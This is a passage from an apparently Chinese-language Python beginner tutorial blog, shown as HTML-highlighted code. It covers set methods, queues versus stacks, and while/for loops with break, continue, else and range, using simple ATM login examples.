&#123;&#x27;2&#x27;, 1, 3, &#x27;aaa&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 避免局限性的去重方式</span></span><br><span class="line">l = [</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;lili&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;jack&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;lili&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;lili&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>&#125;,</span><br><span class="line">]</span><br><span class="line">new_l = []</span><br><span class="line"><span class="keyword">for</span> dict <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">if</span> dict <span class="keyword">not</span> <span class="keyword">in</span> new_l:</span><br><span class="line">        new_l.append(dict)</span><br><span class="line">print(new_l)</span><br></pre></td></tr></table></figure><h3 id="长度、成员运算、循环"><a href="#长度、成员运算、循环" class="headerlink" title="长度、成员运算、循环"></a>长度、成员运算、循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 长度</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">print(len(s)) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 成员运算</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">print(<span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> s) <span class="comment"># True</span></span><br><span class="line">print(<span class="string">&#x27;d&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> s) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> s:</span><br><span class="line">    print(a)</span><br></pre></td></tr></table></figure><h3 id="其他内置方法"><a href="#其他内置方法" class="headerlink" title="其他内置方法"></a>其他内置方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># discard 删除元素，集合内没有元素就不操作不会报错</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">s.discard(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">s.discard(<span class="string">&#x27;f&#x27;</span>) <span class="comment"># 不存在的元素</span></span><br><span class="line">print(s) <span class="comment"># &#123;&#x27;b&#x27;, &#x27;c&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remove 删除元素，集合内没有元素会报错</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line"><span class="comment">## s.remove(&#x27;f&#x27;) # 会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># update 更新集合</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">s.update(&#123;<span class="string">&#x27;a1&#x27;</span>,<span class="string">&#x27;a2&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;)</span><br><span class="line">print(s) <span class="comment"># &#123;&#x27;a1&#x27;, &#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;a2&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># difference_update 差集更新</span></span><br><span class="line"><span class="comment">## difference 差集</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">s = s.difference(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>) <span class="comment"># 将差集赋值给自己</span></span><br><span class="line">print(s) <span class="comment"># &#123;&#x27;a&#x27;&#125;</span></span><br><span class="line"><span class="comment">## 差集更新</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line"><span class="comment">### s.difference_update 等于 s = s.difference(&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;)</span></span><br><span class="line">s.difference_update(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">print(s) <span class="comment"># &#123;&#x27;a&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop 删除 - 由于集合是无序的，所以在集合中是随机删除</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">s.pop()</span><br><span class="line">print(s) <span class="comment"># &#123;&#x27;c&#x27;, &#x27;b&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add 添加</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">s.add(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">print(s) <span class="comment"># &#123;&#x27;d&#x27;, &#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># isdisjoint 如果两个集合没有交集，返回true</span></span><br><span class="line">s = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">print(s.isdisjoint(&#123;<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>&#125;)) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><hr><h1 id="提前补充知识-堆栈和队列的区别"><a href="#提前补充知识-堆栈和队列的区别" class="headerlink" title="提前补充知识-堆栈和队列的区别"></a>提前补充知识-堆栈和队列的区别</h1><p>使用字典记录一下堆栈与队列的区别</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 队列：FIRST IN FIRST OUT(FIFO) 先进先出</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="comment"># # 入队操作</span></span><br><span class="line">l.append(<span class="string">&#x27;first&#x27;</span>)</span><br><span class="line">l.append(<span class="string">&#x27;second&#x27;</span>)</span><br><span class="line">l.append(<span class="string">&#x27;third&#x27;</span>)</span><br><span class="line"><span class="comment"># # 出队操作 - 首先删除的是first -&gt; second -&gt; third</span></span><br><span class="line">l.pop(<span class="number">0</span>)</span><br><span class="line">l.pop(<span class="number">0</span>)</span><br><span class="line">l.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 堆栈：LAST IN FIRST OUT(LIFO) 后进先出</span></span><br><span class="line"><span class="comment"># # 入栈操作</span></span><br><span class="line">l.append(<span class="string">&#x27;first&#x27;</span>)</span><br><span class="line">l.append(<span class="string">&#x27;second&#x27;</span>)</span><br><span class="line">l.append(<span class="string">&#x27;third&#x27;</span>)</span><br><span class="line"><span class="comment"># # 出队操作 - 首先删除的是third -&gt; second -&gt; first</span></span><br><span class="line">l.pop()</span><br><span class="line">l.pop()</span><br><span class="line">l.pop()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13.python流程控制之循环</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/13.python%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B9%8B%E5%BE%AA%E7%8E%AF/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/13.python%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B9%8B%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<p>前文讲了流程控制和if判断语句，本章节就是来介绍循环的，循环结构就是重复执行某段代码块，人类某些时候需要重复做某件事情，所以程序中必须有相应的机制来控制计算机具备人的这种循环做事的能力</p><p>python中有while与for两种循环机制</p><a id="more"></a><hr><h1 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h1><p>while循环又被称之为条件循环，它是先进行判断，后进行循环</p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p><strong>伪代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件:</span><br><span class="line">代码<span class="number">1</span></span><br><span class="line">代码<span class="number">2</span></span><br><span class="line">代码<span class="number">3</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>先判断while后面的条件是否成立，成立就执行下面的循环语句，语句执行完成后，再次判断while后面的条件是否成立，然后不停的往复，直到while条件语句不成立了，然后跳出循环</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902144703239.png" alt="image-20200902144703239"></p><p><strong>演示代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt;= <span class="number">5</span>:</span><br><span class="line">    print(count) <span class="comment"># 输出count当前值</span></span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">print(<span class="string">&quot;循环结束&quot;</span>)<span class="comment"># 此代码不属于循环</span></span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902151005650.png" alt="image-20200902151005650"></p><h2 id="死循环与效率问题"><a href="#死循环与效率问题" class="headerlink" title="死循环与效率问题"></a>死循环与效率问题</h2><p>所谓死循环，就是不会结束的循环，最简单的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(count)</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">print(<span class="string">&quot;循环结束&quot;</span>)</span><br></pre></td></tr></table></figure><p>开始运行后，由于while的条件语句永远为True，它就会被无休止的自加下去</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902151328338.png" alt="image-20200902151328338"></p><p>而且这句话，本身控制的是CPU，让CPU不停的进行高速运算，CPU就会大量散热，就会听到CPU的风扇开始转了起来</p><p>但是呢，有时候死循环并不是一定的坏事，比如用户的操作本来就需要循环进行的时候</p><p><strong>演示代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ATM机简易场景</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    passwd = input(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(passwd == <span class="string">&#x27;123456&#x27;</span>):</span><br><span class="line">        print(<span class="string">&#x27;登陆成功，功能没有开发完全即将退出&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;登陆失败，请重新登陆&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902153259042.png" alt="image-20200902153259042"></p><p>这里由于场景需求，我们需要它死循环，而且因为他有IO交互，交互的时候程序会等待，所以给CPU留出了休息的时间，避免了不停运算的情况</p><h2 id="结束循环的方式"><a href="#结束循环的方式" class="headerlink" title="结束循环的方式"></a>结束循环的方式</h2><h3 id="方式一：判断条件改为False"><a href="#方式一：判断条件改为False" class="headerlink" title="方式一：判断条件改为False"></a>方式一：判断条件改为False</h3><p>while循环会判断循环条件是否为真，为真才进行循环操作，所以我们让他为假就不会循环了</p><p>注意：如果本次判断已经是True了，修改之后，还是同样会完成本次循环，直到下次判断为False才会终止</p><p><strong>演示代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ATM机简易场景</span></span><br><span class="line">tag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> tag:  <span class="comment"># 判断tag</span></span><br><span class="line">    passwd = input(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(passwd == <span class="string">&#x27;123456&#x27;</span>):</span><br><span class="line">        print(<span class="string">&#x27;登陆成功&#x27;</span>)</span><br><span class="line">        tag = <span class="literal">False</span> <span class="comment">#tag修改为False,本次循环完成后再次进行while检测就为假了</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;登陆失败，请重新登陆&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;您的账户余额为0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902155331184.png" alt="image-20200902155331184"></p><h3 id="方式二：添加break"><a href="#方式二：添加break" class="headerlink" title="方式二：添加break"></a>方式二：添加break</h3><p>只要运行到break，就会<strong>立即终止</strong>本层循环</p><p><strong>演示代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ATM机简易场景</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    passwd = input(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(passwd == <span class="string">&#x27;123456&#x27;</span>):</span><br><span class="line">        print(<span class="string">&#x27;登陆成功&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span> <span class="comment"># 立刻终止本层循环</span></span><br><span class="line">        print(<span class="string">&#x27;break之后的代码&#x27;</span>) <span class="comment"># 由于break是立即跳出循环，故此行不运行</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;登陆失败，请重新登陆&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;您的账户余额为0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902172043783.png" alt="image-20200902172043783"></p><p>如果是多层嵌套循环，想要跳出多层循环，就需要每一层都添加break</p><p><strong>伪代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="方式三：continue"><a href="#方式三：continue" class="headerlink" title="方式三：continue"></a>方式三：continue</h3><p>while可以和continue连用，其作用是结束掉本次循环，直接进入下一次</p><p><strong>演示代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 跳过4的打印</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;=<span class="number">10</span>:</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">4</span>:</span><br><span class="line">        a += <span class="number">1</span>  <span class="comment"># 如果这里没有+1，本次循环跳出之后，a还是等于4，就会陷入死循环</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    print(a)</span><br><span class="line">    a += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902175122760.png" alt="image-20200902175122760"></p><h2 id="while与else连用"><a href="#while与else连用" class="headerlink" title="while与else连用"></a>while与else连用</h2><p>在while中也可以使用else，但是要想让else的代码运行，必须要是while结束循环之后，并且循环不是因为break中途打断才结束才可以</p><p><strong>演示代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line">b = int(input(请输入最大值))</span><br><span class="line"><span class="keyword">while</span> count &lt;= b:</span><br><span class="line">    print(count)</span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;正常的退出&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个代码是让程序从0输出到我们想要的整数，但是我们在6的位置添加了break，也就是说限制到小于6，大于6会被break给退出</p><p>我们输入小于6的任意数，else都会同步输出</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902180723106.png" alt="image-20200902180723106"></p><p>但是如果大于了5，就不会运行else语句</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200902180828348.png" alt="image-20200902180828348"></p><h3 id="案例用法"><a href="#案例用法" class="headerlink" title="案例用法"></a>案例用法</h3><p>将上面的ATM取款机代码进行优化(取款机代码限制输错次数3次)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span>   <span class="comment">#计次</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">3</span>:</span><br><span class="line">    username = input(<span class="string">&quot;请输入账号：&quot;</span>)</span><br><span class="line">    password = input(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        print(<span class="string">&quot;登陆成功！&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">&quot;密码错误&#123;&#125;次&quot;</span>.format(count))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;密码错误三次，卡已经冻结&quot;</span>)</span><br></pre></td></tr></table></figure><p>登陆成功返回</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200903135550665.png" alt="image-20200903135550665"></p><p>密码错误返回</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200903135614874.png" alt="image-20200903135614874"></p><hr><h1 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h1><p>for循环，又被称为迭代循环(取值循环)，是python提供的第二种循环机制，从理论上for循环能做的事情，while循环都能做，for循环在循环取值上面比while更加简便</p><h2 id="基本循环"><a href="#基本循环" class="headerlink" title="基本循环"></a>基本循环</h2><p><strong>伪代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可迭代对象可以是：列表、字典、字符串、元组、集合</span></span><br><span class="line"><span class="keyword">for</span> 变量名 <span class="keyword">in</span> 可迭代对象:</span><br><span class="line">代码<span class="number">1</span></span><br><span class="line">代码<span class="number">2</span></span><br><span class="line">代码<span class="number">3</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p><strong>演示代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;amber&#x27;</span>,<span class="string">&#x27;alisa&#x27;</span>,<span class="string">&#x27;AYM&#x27;</span>]:</span><br><span class="line">    print(x)</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200904165903990.png" alt="image-20200904165903990"></p><p>for循环会将可迭代对象中的值一个一个的取出来，直到整个可迭代对象的值被取干净为止</p><p>for循环的次数取决于可迭代对象内部值的个数</p><p>for循环取字典，默认取出来的是字典的key，取value可以通过dic[key]的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;kinght&#x27;</span>:<span class="string">&#x27;amber&#x27;</span>,<span class="string">&#x27;alisa&#x27;</span>:<span class="string">&#x27;AYM&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">    print(x,<span class="string">&#x27;:&#x27;</span>,dic[x])</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200904170647949.png" alt="image-20200904170647949"></p><h2 id="for循环控制循环次数"><a href="#for循环控制循环次数" class="headerlink" title="for循环控制循环次数"></a>for循环控制循环次数</h2><h3 id="range"><a href="#range" class="headerlink" title="range()"></a>range()</h3><p>在这里首先介绍一个函数<code>range()</code>，这是一个在python2就有的功能，他的功能是生成从0开始的数组，括号里是多少，就生成序号到多少的列表</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200904232729258.png" alt="image-20200904232729258"></p><p>也可以直接指定列表数字(python2)，<strong>头能取，尾取-1</strong></p><p><img src="jpg/13.python%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B9%8B%E5%BE%AA%E7%8E%AF/image-20200912002330702.png" alt="image-20200912002330702"></p><p>指定步长取等差数列(步长为2)</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201007091105330.png" alt="image-20201007091105330"></p><p>Python3 range() 函数返回的是一个可迭代对象（类型是对象），而不是列表类型， 所以打印的时候不会打印列表，这样做内存空间优化了，使用并不会有什么区别</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201011110507902.png"></p><p>对前文模拟登陆代码的修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sys_name = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">sys_pwd = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    name = input(<span class="string">&quot;请输入账号：&quot;</span>)</span><br><span class="line">    pwd = input(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(name == sys_name <span class="keyword">and</span> pwd == sys_pwd):</span><br><span class="line">        print(<span class="string">&quot;密码正确&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;密码错误&#123;&#125;次,还有&#123;&#125;次机会&quot;</span>.format((x+<span class="number">1</span>),(<span class="number">2</span>-x)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;账号验证错误次数过多，请联系管理员找回密码&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="len"><a href="#len" class="headerlink" title="len()"></a>len()</h3><p>数列表个数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">print(len(l))<span class="comment">#输出结果为6</span></span><br></pre></td></tr></table></figure><h2 id="for-continue"><a href="#for-continue" class="headerlink" title="for+continue"></a>for+continue</h2><p>for循环和while循环与continue连用效果相同，其作用是结束掉本次循环，直接进入下一次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 